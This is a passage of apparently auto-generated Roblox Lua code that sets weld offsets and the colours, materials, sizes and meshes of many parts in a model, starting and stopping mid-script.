Weld117.part1 = Part299
Weld118.Name = "BTWeld"
Weld118.Parent = Part3
Weld118.C1 = CFrame.new(-4.76837158e-07, -2.59509277, 3.90086365, -1, 3.87430191e-07, 3.84452505e-07, 5.47152013e-09, 0.713250041, -0.700909913, -5.47152013e-07, -0.700909972, -0.713250101)
Weld118.Part0 = Part3
Weld118.Part1 = Part461
Weld118.part1 = Part461
Weld119.Name = "BTWeld"
Weld119.Parent = Part3
Weld119.C1 = CFrame.new(-3.4570694e-06, 3.23180103, 0.775444984, 1, -1.19092874e-07, 2.05247488e-07, -1.07567757e-07, -0.998391926, -0.056692116, 2.10009603e-07, 0.0566921085, -0.998391867)
Weld119.Part0 = Part3
Weld119.Part1 = Part349
Weld119.part1 = Part349
Weld120.Name = "BTWeld"
Weld120.Parent = Part3
Weld120.C1 = CFrame.new(-0.854813099, -0.0312469006, 0.683163643, 1.75787136e-08, -0.707106531, 0.707107306, -1, -9.8021701e-08, -7.47404556e-08, 1.20606273e-07, -0.707107365, -0.707106531)
Weld120.Part0 = Part3
Weld120.Part1 = Part217
Weld120.part1 = Part217
Weld121.Name = "BTWeld"
Weld121.Parent = Part3
Weld121.C1 = CFrame.new(8.94069672e-07, 0.388443947, 0.0130519867, -1, 2.08383426e-07, 3.34477591e-07, -3.4889672e-07, -0.866025686, -0.49999994, 1.87254045e-07, -0.499999881, 0.866025686)
Weld121.Part0 = Part3
Weld121.Part1 = Part393
Weld121.part1 = Part393
Weld122.Name = "BTWeld"
Weld122.Parent = Part3
Weld122.C1 = CFrame.new(1.84774399e-06, -1.088727, -0.591116905, -1, 1.18976459e-07, 3.0064075e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, 3.02987246e-07, -5.77419996e-08, 1.00000024)
Weld122.Part0 = Part3
Weld122.Part1 = Part287
Weld122.part1 = Part287
Weld123.Name = "BTWeld"
Weld123.Parent = Part3
Weld123.C1 = CFrame.new(-2.98023224e-06, 0.291165352, -0.776105642, 1, 2.08732672e-07, 7.35781214e-08, -2.08383426e-07, 1.00000024, 1.78813934e-07, -7.12225301e-08, -1.76951289e-07, 1.00000024)
Weld123.Part0 = Part3
Weld123.Part1 = Part235
Weld123.part1 = Part235
Weld124.Name = "BTWeld"
Weld124.Parent = Part3
Weld124.C1 = CFrame.new(-1.78813934e-06, -0.316618919, 0.434119701, 1, -1.19092874e-07, -2.68964868e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, -2.71322278e-07, 5.77419996e-08, -1.00000024)
Weld124.Part0 = Part3
Weld124.Part1 = Part227
Weld124.part1 = Part227
Weld125.Name = "BTWeld"
Weld125.Parent = Part3
Weld125.C1 = CFrame.new(1.7285347e-06, -0.568753242, -0.743589878, -1, 1.18976459e-07, 3.28123861e-07, -1.1944212e-07, -1.00000024, -8.94069672e-08, 3.30041075e-07, -8.7544322e-08, 1.00000024)
Weld125.Part0 = Part3
Weld125.Part1 = Part375
Weld125.part1 = Part375
Weld126.Name = "BTWeld"
Weld126.Parent = Part3
Weld126.C1 = CFrame.new(1.1920929e-06, 0.194246531, 0.194999695, -1, -2.08732672e-07, 1.17877789e-07, -1.20393452e-07, -1.19395554e-06, -1.00000024, 2.08499841e-07, -1.00000024, 1.1920929e-06)
Weld126.Part0 = Part3
Weld126.Part1 = Part223
Weld126.part1 = Part223
Weld127.Name = "BTWeld"
Weld127.Parent = Part3
Weld127.C1 = CFrame.new(2.08616257e-06, 0.382621765, 0.593743563, -1, -2.32830644e-10, -8.87230271e-08, 2.32830644e-10, 1.00000024, 1.86264515e-09, 8.63965397e-08, -1.86264515e-09, -1.00000024)
Weld127.Part0 = Part3
Weld127.Part1 = Part347
Weld127.part1 = Part347
Weld128.Name = "BTWeld"
Weld128.Parent = Part3
Weld128.C1 = CFrame.new(3.87430191e-06, -3.59139156, -0.606614113, -1, 2.08383426e-07, 1.49542757e-07, -2.08732672e-07, -1.00000024, -5.96046448e-08, 1.52112989e-07, -5.77419996e-08, 1.00000024)
Weld128.Part0 = Part3
Weld128.Part1 = Part207
Weld128.part1 = Part207
Weld129.Name = "BTWeld"
Weld129.Parent = Part3
Weld129.C1 = CFrame.new(3.64600849, -0.0312508941, -0.13107121, -2.47033313e-07, -0.994522214, -0.104528487, 1, -2.45636329e-07, -2.16805347e-08, -2.28465069e-09, -0.104528487, 0.994522214)
Weld129.Part0 = Part3
Weld129.Part1 = Part273
Weld129.part1 = Part273
Weld130.Name = "BTWeld"
Weld130.Parent = Part3
Weld130.C1 = CFrame.new(-1.84774399e-06, -0.879115105, 0.593742847, 1, -1.19092874e-07, -2.13065505e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, -2.15442924e-07, 5.77419996e-08, -1.00000024)
Weld130.Part0 = Part3
Weld130.Part1 = Part369
Weld130.part1 = Part369
Weld131.Name = "BTWeld"
Weld131.Parent = Part3
Weld131.C1 = CFrame.new(3.51667404e-06, 2.25183678, 0.638117313, -1, -8.95233825e-08, 3.02316039e-08, -8.92905518e-08, 1.00000024, 5.96046448e-08, -3.29036993e-08, 5.77419996e-08, -1.00000024)
Weld131.Part0 = Part3
Weld131.Part1 = Part285
Weld131.part1 = Part285
Weld132.Name = "BTWeld"
Weld132.Parent = Part3
Weld132.C1 = CFrame.new(1.93451023, -0.0312511921, -0.27059412, -2.42958777e-07, -0.998629749, -0.0523359664, 1, -2.42260285e-07, -8.10723577e-09, -2.90310709e-09, -0.0523359701, 0.998629689)
Weld132.Part0 = Part3
Weld132.Part1 = Part405
Weld132.part1 = Part405
Weld133.Name = "BTWeld"
Weld133.Parent = Part3
Weld133.C1 = CFrame.new(3.63588333e-06, -1.6542244, -0.638116837, -1, 1.18976459e-07, 3.0064075e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, 3.02987246e-07, -5.77419996e-08, 1.00000024)
Weld133.Part0 = Part3
Weld133.Part1 = Part359
Weld133.part1 = Part359
Weld134.Name = "BTWeld"
Weld134.Parent = Part3
Weld134.C1 = CFrame.new(-1.78813934e-06, 0.12912178, -0.362743616, 1, 2.32830644e-10, -1.18105163e-07, 2.32830644e-10, 1.00000024, 1.80676579e-07, 1.20164259e-07, -1.76951289e-07, 1.00000024)
Weld134.Part0 = Part3
Weld134.Part1 = Part183
Weld134.part1 = Part183
Weld135.Name = "BTWeld"
Weld135.Parent = Part3
Weld135.C1 = CFrame.new(-1.7285347e-06, 0.139364243, -0.256871939, 1, -1.18976459e-07, -1.49711923e-07, 1.1944212e-07, 1.00000024, 0, 1.52022039e-07, 1.86264515e-09, 1.00000024)
Weld135.Part0 = Part3
Weld135.Part1 = Part225
Weld135.part1 = Part225
Weld136.Name = "BTWeld"
Weld136.Parent = Part3
Weld136.C1 = CFrame.new(2.86102295e-06, 0.0545005798, 0.453119755, -1, -2.32830644e-10, -8.87230271e-08, 2.32830644e-10, 1.00000024, 1.86264515e-09, 8.63965397e-08, -1.86264515e-09, -1.00000024)
Weld136.Part0 = Part3
Weld136.Part1 = Part337
Weld136.part1 = Part337
Weld137.Name = "BTWeld"
Weld137.Parent = Part3
Weld137.C1 = CFrame.new(0.246384621, -0.0312500596, 0.315700054, 5.82076609e-09, 0.965926111, -0.258819044, -1, 2.29338184e-08, 6.17128535e-08, 6.73753675e-08, 0.258819014, 0.965926111)
Weld137.Part0 = Part3
Weld137.Part1 = Part245
Weld137.part1 = Part245
Weld138.Name = "BTWeld"
Weld138.Parent = Part3
Weld138.C1 = CFrame.new(-1.07288361e-06, 1.90734863e-06, 0.152749538, 1, -1.18976459e-07, -3.88215994e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, -3.90531568e-07, 5.77419996e-08, -1.00000024)
Weld138.Part0 = Part3
Weld138.Part1 = Part309
Weld138.part1 = Part309
Weld139.Name = "BTWeld"
Weld139.Parent = Part3
Weld139.C1 = CFrame.new(-3.03983688e-06, 0.82331419, -0.458539009, 1, 2.08732672e-07, 7.35781214e-08, -9.66247171e-08, 0.707106471, -0.707107365, -1.97673216e-07, 0.707107365, 0.707106471)
Weld139.Part0 = Part3
Weld139.Part1 = Part181
Weld139.part1 = Part181
Weld140.Name = "BTWeld"
Weld140.Parent = Part3
Weld140.C1 = CFrame.new(-3.39746475e-06, -1.05464268, -1.43672371, 1, 2.08732672e-07, -4.8930815e-10, -1.93249434e-07, 0.922201157, -0.386711091, -7.82310963e-08, 0.386711091, 0.922201216)
Weld140.Part0 = Part3
Weld140.Part1 = Part333
Weld140.part1 = Part333
Weld141.Name = "BTWeld"
Weld141.Parent = Part3
Weld141.C1 = CFrame.new(0.0437097549, -0.0312481523, 1.49426508, -1.02329068e-07, -0.707107306, -0.707106531, -1, -1.1047814e-07, 2.52499376e-07, -2.57976353e-07, 0.70710659, -0.707107306)
Weld141.Part0 = Part3
Weld141.Part1 = Part249
Weld141.part1 = Part249
Weld142.Name = "BTWeld"
Weld142.Parent = Part3
Weld142.C1 = CFrame.new(1.84774399e-06, 1.04499984, 4.84788132, -1, -2.32830644e-10, 1.16708179e-07, -1.19271135e-07, -1.01514161e-06, -1.00000024, -1.16415322e-10, -1.00000024, 1.01141632e-06)
Weld142.Part0 = Part3
Weld142.Part1 = Part205
Weld142.part1 = Part205
Weld143.Name = "BTWeld"
Weld143.Parent = Part3
Weld143.C1 = CFrame.new(-3.03983688e-06, 0.591758728, 0.577001572, 1, -1.18976459e-07, 2.07579433e-07, -1.19325705e-07, -1.00000024, 3.57627869e-07, 2.05687684e-07, -3.57627869e-07, -1.00000024)
Weld143.Part0 = Part3
Weld143.Part1 = Part385
Weld143.part1 = Part385
Weld144.Name = "BTWeld"
Weld144.Parent = Part3
Weld144.C1 = CFrame.new(-0.568752289, -0.0312482715, 1.24358273, -5.98374754e-08, -1.00000024, 0, -1, 5.93718141e-08, 3.27925591e-07, -3.30370312e-07, -1.86264515e-09, -1.00000024)
Weld144.Part0 = Part3
Weld144.Part1 = Part197
Weld144.part1 = Part197
Weld145.Name = "BTWeld"
Weld145.Parent = Part3
Weld145.C1 = CFrame.new(8.34465027e-07, 0.340940475, -0.537741661, -1, 2.08383426e-07, 3.34477591e-07, -1.24564394e-08, -0.866025329, 0.500000596, 3.95695679e-07, 0.500000596, 0.866025448)
Weld145.Part0 = Part3
Weld145.Part1 = Part357
Weld145.part1 = Part357
Weld146.Name = "BTWeld"
Weld146.Parent = Part3
Weld146.C1 = CFrame.new(-0.0784215927, -0.0312500596, 0.188100338, -2.43075192e-07, -0.866025627, -0.5, 1, -2.29571015e-07, -8.65911716e-08, -3.80096026e-08, -0.49999994, 0.866025686)
Weld146.Part0 = Part3
Weld146.Part1 = Part343
Weld146.part1 = Part343
Weld147.Name = "BTWeld"
Weld147.Parent = Part3
Weld147.C1 = CFrame.new(0.078420639, -0.0312501192, 0.188100815, 1.53668225e-07, 0.866025686, 0.5, -1, 1.49011612e-07, 4.73319233e-08, -3.19560058e-08, -0.49999994, 0.866025686)
Weld147.Part0 = Part3
Weld147.Part1 = Part353
Weld147.part1 = Part353
Weld148.Name = "BTWeld"
Weld148.Parent = Part3
Weld148.C1 = CFrame.new(-3.39746475e-06, -1.19873238, -1.4971447, 1, 2.08732672e-07, -4.8930815e-10, -1.93249434e-07, 0.922201157, -0.386711091, -7.82310963e-08, 0.386711091, 0.922201216)
Weld148.Part0 = Part3
Weld148.Part1 = Part313
Weld148.part1 = Part313
Weld149.Name = "BTWeld"
Weld149.Parent = Part3
Weld149.C1 = CFrame.new(-0.665288925, -0.0312472582, -0.400229454, 6.10016286e-08, 0.999914467, 0.0130897425, -1, 6.01867214e-08, 2.42216629e-08, 2.52284735e-08, -0.0130897434, 0.999914587)
Weld149.Part0 = Part3
Weld149.Part1 = Part211
Weld149.part1 = Part211
Weld150.Name = "BTWeld"
Weld150.Parent = Part3
Weld150.C1 = CFrame.new(1.78813934e-06, -0.22074604, -0.390618801, -1, 1.18976459e-07, 3.56074452e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, 3.58400939e-07, -5.77419996e-08, 1.00000024)
Weld150.Part0 = Part3
Weld150.Part1 = Part311
Weld150.part1 = Part311
Weld151.Name = "BTWeld"
Weld151.Parent = Part3
Weld151.C1 = CFrame.new(-3.39746475e-06, -1.12668896, -1.46693516, 1, 2.08732672e-07, -4.8930815e-10, -1.93249434e-07, 0.922201157, -0.386711091, -7.82310963e-08, 0.386711091, 0.922201216)
Weld151.Part0 = Part3
Weld151.Part1 = Part319
Weld151.part1 = Part319
Weld152.Name = "BTWeld"
Weld152.Parent = Part3
Weld152.C1 = CFrame.new(-3.03983688e-06, 0.522769928, 0.783498287, 1, -1.18976459e-07, 2.07579433e-07, -1.19325705e-07, -1.00000024, 3.57627869e-07, 2.05687684e-07, -3.57627869e-07, -1.00000024)
Weld152.Part0 = Part3
Weld152.Part1 = Part189
Weld152.part1 = Part189
Weld153.Name = "BTWeld"
Weld153.Parent = Part3
Weld153.C1 = CFrame.new(0.854812145, -0.0312569141, 0.683163643, -7.71833584e-08, 0.707106531, -0.707107306, 1, 1.8987339e-07, 8.20728019e-08, 1.90921128e-07, -0.707107365, -0.707106531)
Weld153.Part0 = Part3
Weld153.Part1 = Part271
Weld153.part1 = Part271
Weld154.Name = "BTWeld"
Weld154.Parent = Part3
Weld154.C1 = CFrame.new(1.78813934e-06, -0.589484215, -0.222372532, -1, 2.08499841e-07, 2.3712164e-07, -2.08849087e-07, -1.00000024, 0, 2.39566361e-07, 1.86264515e-09, 1.00000024)
Weld154.Part0 = Part3
Weld154.Part1 = Part303
Weld154.part1 = Part303
Weld155.Name = "BTWeld"
Weld155.Parent = Part3
Weld155.C1 = CFrame.new(-2.44379044e-06, 1.74366188, -2.46923256, 1, -3.87313776e-07, -1.35698428e-07, -2.53145117e-07, -0.31730628, -0.948323369, 3.2375101e-07, 0.948323369, -0.31730631)
Weld155.Part0 = Part3
Weld155.Part1 = Part305
Weld155.part1 = Part305
Weld156.Name = "BTWeld"
Weld156.Parent = Part3
Weld156.C1 = CFrame.new(2.74181366e-06, 0.0869274139, -0.603420258, -1, 2.08499841e-07, 2.86032446e-07, 5.57629392e-08, -0.707106411, 0.707107425, 3.51225026e-07, 0.707107425, 0.707106411)
Weld156.Part0 = Part3
Weld156.Part1 = Part413
Weld156.part1 = Part413
Weld157.Name = "BTWeld"
Weld157.Parent = Part3
Weld157.C1 = CFrame.new(-1.25169754e-06, 2.73876762, 0.462646961, 1, -2.08499841e-07, 1.89578714e-07, -1.861481e-07, -0.993572116, -0.113202803, 2.0985317e-07, 0.113202795, -0.993572176)
Weld157.Part0 = Part3
Weld157.Part1 = Part267
Weld157.part1 = Part267
Weld158.Name = "BTWeld"
Weld158.Parent = Part3
Weld158.C1 = CFrame.new(8.94069672e-07, 0.443323135, -0.28379035, -1, 2.08383426e-07, 3.34477591e-07, -2.08732672e-07, -1.00000024, 1.78813934e-07, 3.36614903e-07, 1.80676579e-07, 1.00000024)
Weld158.Part0 = Part3
Weld158.Part1 = Part439
Weld158.part1 = Part439
Weld159.Name = "BTWeld"
Weld159.Parent = Part3
Weld159.C1 = CFrame.new(-2.98023224e-07, 2.46521568, 0.596743584, -1, -8.95233825e-08, 3.02316039e-08, -8.92905518e-08, 1.00000024, 5.96046448e-08, -3.29036993e-08, 5.77419996e-08, -1.00000024)
Weld159.Part0 = Part3
Weld159.Part1 = Part201
Weld159.part1 = Part201
Weld160.Name = "BTWeld"
Weld160.Parent = Part3
Weld160.C1 = CFrame.new(0.665288925, -0.0312529206, -0.400229454, -1.50408596e-07, -0.999914527, -0.0130897444, 1, -1.49477273e-07, -2.5913323e-08, 2.56950443e-08, -0.0130897444, 0.999914587)
Weld160.Part0 = Part3
Weld160.Part1 = Part279
Weld160.part1 = Part279
Weld161.Name = "BTWeld"
Weld161.Parent = Part3
Weld161.C1 = CFrame.new(-3.63588333e-06, 1.55414867, 1.9456358, 1, 8.95233825e-08, 2.22247763e-07, -4.30736691e-08, -0.843391299, 0.537300408, 2.34518666e-07, -0.537300348, -0.84339118)
Weld161.Part0 = Part3
Weld161.Part1 = Part335
Weld161.part1 = Part335
Weld162.Name = "BTWeld"
Weld162.Parent = Part3
Weld162.C1 = CFrame.new(8.34465027e-07, -3.73201656, 0.770674467, 1, 2.32830644e-10, -2.6903399e-07, -2.32830644e-10, -1.00000024, 8.7544322e-08, -2.71093086e-07, -9.12696123e-08, -1.00000024)
Weld162.Part0 = Part3
Weld162.Part1 = Part185
Weld162.part1 = Part185
Part163.Parent = Model0
Part163.CFrame = CFrame.new(-0.611257851, 3.46313882, -15.394145, 0.999985635, -0.00162807317, 0.00510706799, 0.00513700349, 0.0189462826, -0.999807417, 0.00153099932, 0.999819279, 0.0189543739)
Part163.Orientation = Vector3.new(88.8799973, 15.0799999, 15.1700001)
Part163.Position = Vector3.new(-0.611257851, 3.46313882, -15.394145)
Part163.Rotation = Vector3.new(88.909996, 0.289999992, 0.0899999961)
Part163.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part163.Velocity = Vector3.new(2.31788153e-08, 0.0024639722, 3.04594494e-07)
Part163.Size = Vector3.new(0.275000006, 0.84512496, 0.359375)
Part163.Anchored = true
Part163.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part163.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part163.BrickColor = BrickColor.new("Really black")
Part163.CanCollide = false
Part163.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part163.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part163.Material = Enum.Material.Metal
Part163.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part163.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part163.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part163.brickColor = BrickColor.new("Really black")
SpecialMesh164.Parent = Part163
SpecialMesh164.Scale = Vector3.new(0.349999994, 1, 0.5)
SpecialMesh164.MeshType = Enum.MeshType.Brick
Part165.Parent = Model0
Part165.CFrame = CFrame.new(-0.617485046, 3.2590127, -10.6418428, -0.999985635, -0.00414685067, -0.00339615461, -0.00513672922, 0.560423911, 0.828190207, -0.00153109396, 0.828195751, -0.560437143)
Part165.Orientation = Vector3.new(-55.9099998, -179.649994, -0.529999971)
Part165.Position = Vector3.new(-0.617485046, 3.2590127, -10.6418428)
Part165.Rotation = Vector3.new(-124.089996, -0.189999998, 179.759995)
Part165.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part165.Velocity = Vector3.new(5.55462663e-08, 0.00247387378, 7.29936687e-07)
Part165.Size = Vector3.new(0.275000006, 0.4375, 0.25)
Part165.Anchored = true
Part165.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part165.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part165.BrickColor = BrickColor.new("Really black")
Part165.CanCollide = false
Part165.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part165.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part165.Material = Enum.Material.Metal
Part165.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part165.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part165.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part165.brickColor = BrickColor.new("Really black")
SpecialMesh166.Parent = Part165
SpecialMesh166.Scale = Vector3.new(0.5, 1, 0.25)
SpecialMesh166.MeshType = Enum.MeshType.Brick
Part167.Parent = Model0
Part167.CFrame = CFrame.new(-0.610199153, 2.88768315, -14.1553068, 0.999985635, 0.00162795268, -0.00510686403, 0.0051367972, -0.0189460143, 0.999807417, 0.00153088395, -0.999819279, -0.0189541057)
Part167.Orientation = Vector3.new(-88.8799973, -164.919998, 164.830002)
Part167.Position = Vector3.new(-0.610199153, 2.88768315, -14.1553068)
Part167.Rotation = Vector3.new(-91.0899963, -0.289999992, -0.0899999961)
Part167.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part167.Velocity = Vector3.new(1.14426342e-07, 0.00246655382, 1.50368453e-06)
Part167.Size = Vector3.new(0.275000006, 0.207000002, 0.303375006)
Part167.Anchored = true
Part167.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part167.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part167.BrickColor = BrickColor.new("Really black")
Part167.CanCollide = false
Part167.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part167.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part167.Material = Enum.Material.Glass
Part167.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part167.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part167.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part167.brickColor = BrickColor.new("Really black")
SpecialMesh168.Parent = Part167
SpecialMesh168.Scale = Vector3.new(0.524999976, 0.5, 0.5)
SpecialMesh168.MeshType = Enum.MeshType.Wedge
Part169.Parent = Model0
Part169.CFrame = CFrame.new(-0.613238811, 3.32843637, -13.6493177, -0.999985635, -0.00162807142, -0.00510653527, -0.00513647031, 0.0189459249, 0.999807417, -0.00153100933, 0.999819279, -0.0189540163)
Part169.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part169.Position = Vector3.new(-0.613238811, 3.32843637, -13.6493177)
Part169.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part169.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part169.Velocity = Vector3.new(4.45380195e-08, 0.00246760761, 5.85277007e-07)
Part169.Size = Vector3.new(0.275000006, 0.698124886, 0.534374952)
Part169.Anchored = true
Part169.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part169.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part169.BrickColor = BrickColor.new("Bright blue")
Part169.CanCollide = false
Part169.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part169.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part169.Material = Enum.Material.Neon
Part169.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part169.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part169.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part169.brickColor = BrickColor.new("Bright blue")
SpecialMesh170.Parent = Part169
SpecialMesh170.Scale = Vector3.new(0.452499986, 1, 1)
SpecialMesh170.MeshType = Enum.MeshType.Cylinder
Part171.Parent = Model0
Part171.CFrame = CFrame.new(-0.610366702, 3.28867483, -15.3908367, 0.999985635, -0.00162807317, 0.00510706799, 0.00513700349, 0.0189462826, -0.999807417, 0.00153099932, 0.999819279, 0.0189543739)
Part171.Orientation = Vector3.new(88.8799973, 15.0799999, 15.1700001)
Part171.Position = Vector3.new(-0.610366702, 3.28867483, -15.3908367)
Part171.Rotation = Vector3.new(88.909996, 0.289999992, 0.0899999961)
Part171.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part171.Velocity = Vector3.new(5.08428144e-08, 0.00246397941, 6.68129019e-07)
Part171.Size = Vector3.new(0.275000006, 0.84512496, 0.422374964)
Part171.Anchored = true
Part171.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part171.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part171.BrickColor = BrickColor.new("Really black")
Part171.CanCollide = false
Part171.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part171.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part171.Material = Enum.Material.Metal
Part171.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part171.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part171.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part171.brickColor = BrickColor.new("Really black")
SpecialMesh172.Parent = Part171
SpecialMesh172.Scale = Vector3.new(0.400000006, 1, 0.5)
SpecialMesh172.MeshType = Enum.MeshType.Brick
Part173.Parent = Model0
Part173.CFrame = CFrame.new(-0.610880256, 2.96906447, -13.9840736, -0.999985635, -0.00162807154, -0.00510650687, -0.00513644237, 0.0189459547, 0.999807417, -0.00153100991, 0.999819279, -0.0189540461)
Part173.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part173.Position = Vector3.new(-0.610880256, 2.96906447, -13.9840736)
Part173.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part173.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part173.Velocity = Vector3.new(1.01522062e-07, 0.00246691052, 1.33410845e-06)
Part173.Size = Vector3.new(0.275000006, 0.239124984, 0.205375016)
Part173.Anchored = true
Part173.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part173.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part173.BrickColor = BrickColor.new("Bright blue")
Part173.CanCollide = false
Part173.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part173.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part173.Material = Enum.Material.Neon
Part173.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part173.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part173.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part173.brickColor = BrickColor.new("Bright blue")
SpecialMesh174.Parent = Part173
SpecialMesh174.Scale = Vector3.new(0.550000012, 1, 1)
SpecialMesh174.MeshType = Enum.MeshType.Brick
Part175.Parent = Model0
Part175.CFrame = CFrame.new(-0.613238811, 3.32843637, -13.6493177, -0.999985635, -0.00162807142, -0.00510653527, -0.00513647031, 0.0189459249, 0.999807417, -0.00153100933, 0.999819279, -0.0189540163)
Part175.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part175.Position = Vector3.new(-0.613238811, 3.32843637, -13.6493177)
Part175.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part175.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part175.Velocity = Vector3.new(4.45380195e-08, 0.00246760761, 5.85277007e-07)
Part175.Size = Vector3.new(0.275000006, 0.698124886, 0.372374952)
Part175.Anchored = true
Part175.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part175.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part175.BrickColor = BrickColor.new("Really black")
Part175.CanCollide = false
Part175.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part175.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part175.Material = Enum.Material.Metal
Part175.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part175.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part175.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part175.brickColor = BrickColor.new("Really black")
SpecialMesh176.Parent = Part175
SpecialMesh176.Scale = Vector3.new(0.455000013, 1, 1)
SpecialMesh176.MeshType = Enum.MeshType.Cylinder
Part177.Parent = Model0
Part177.CFrame = CFrame.new(-0.616063476, 3.26214504, -11.5807333, -0.999985635, -0.00162807154, -0.00510656228, -0.00513649778, 0.0189459547, 0.999807417, -0.00153100886, 0.999819279, -0.0189540461)
Part177.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part177.Position = Vector3.new(-0.616063476, 3.26214504, -11.5807333)
Part177.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part177.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part177.Velocity = Vector3.new(5.50495756e-08, 0.00247191754, 7.23409755e-07)
Part177.Size = Vector3.new(0.275000006, 0.630125046, 0.280375004)
Part177.Anchored = true
Part177.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part177.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part177.BrickColor = BrickColor.new("Really black")
Part177.CanCollide = false
Part177.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part177.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part177.Material = Enum.Material.Metal
Part177.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part177.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part177.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part177.brickColor = BrickColor.new("Really black")
SpecialMesh178.Parent = Part177
SpecialMesh178.Scale = Vector3.new(0.400000006, 1.04999995, 0.5)
SpecialMesh178.MeshType = Enum.MeshType.Brick
Part179.Parent = Model0
Part179.CFrame = CFrame.new(-0.610621691, 3.13382888, -14.7050791, 0.999985635, -0.00476216245, 0.00246017892, 0.00513689732, 0.720368028, -0.693573177, 0.00153067347, 0.693575799, 0.720382154)
Part179.Orientation = Vector3.new(43.9099998, 0.199999988, 0.409999996)
Part179.Position = Vector3.new(-0.610621691, 3.13382888, -14.7050791)
Part179.Rotation = Vector3.new(43.9099998, 0.140000001, 0.269999981)
Part179.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part179.Velocity = Vector3.new(7.53960734e-08, 0.0024654083, 9.90785111e-07)
Part179.Size = Vector3.new(0.275000006, 0.221124932, 0.418375015)
Part179.Anchored = true
Part179.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part179.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part179.BrickColor = BrickColor.new("Really black")
Part179.CanCollide = false
Part179.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part179.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part179.Material = Enum.Material.Metal
Part179.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part179.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part179.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part179.brickColor = BrickColor.new("Really black")
SpecialMesh180.Parent = Part179
